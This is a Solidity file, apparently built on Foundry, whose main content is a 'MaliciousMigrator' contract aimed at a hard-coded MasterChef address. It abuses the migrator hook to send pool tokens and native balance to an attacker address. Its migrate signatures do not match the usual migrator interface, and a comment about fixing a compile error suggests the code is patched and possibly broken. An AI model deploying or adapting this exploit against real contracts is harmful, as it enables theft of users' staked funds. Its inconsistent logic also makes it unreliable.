pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IERC20 {
    function transfer(address to, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
}

interface IMasterChef {
    function setMigrator(address _migrator) external;
    function migrate(uint256 pid) external;
    function migrate() external;
    function owner() external view returns (address);
    function poolLength() external view returns (uint256);
}

contract MaliciousMigrator {
    address public attacker;
    // Defined TARGET to fix undeclared identifier error in this scope
    address constant TARGET = 0x4B6c8959a41475347226d51f37eC9a1E09F39a92;

    constructor(address _attacker) {
        attacker = _attacker;
    }

    // Standard MasterChef migrator interface
    function migrate(address _token, uint256 _amount) external {
        require(msg.sender == TARGET, "Only MasterChef can call");
        IERC20(_token).transfer(attacker, _amount);
    }

    // Alternative migrate function signature
    function migrate(address token) external {
        require(msg.sender == TARGET, "Only MasterChef can call");
        uint256 balance = IERC20(token).balanceOf(address(this));
        if (balance > 0) {
            IERC20(token).transfer(attacker, balance);
        }
    }

    // Drain any tokens held by this contract
    function drain() external {
        // Send native balance to attacker
        uint256 nativeBalance = address(this).balance;
        if (nativeBalance > 0) {
            payable(attacker).transfer(nativeBalance);
        }
    }

    receive() external payable {}
}

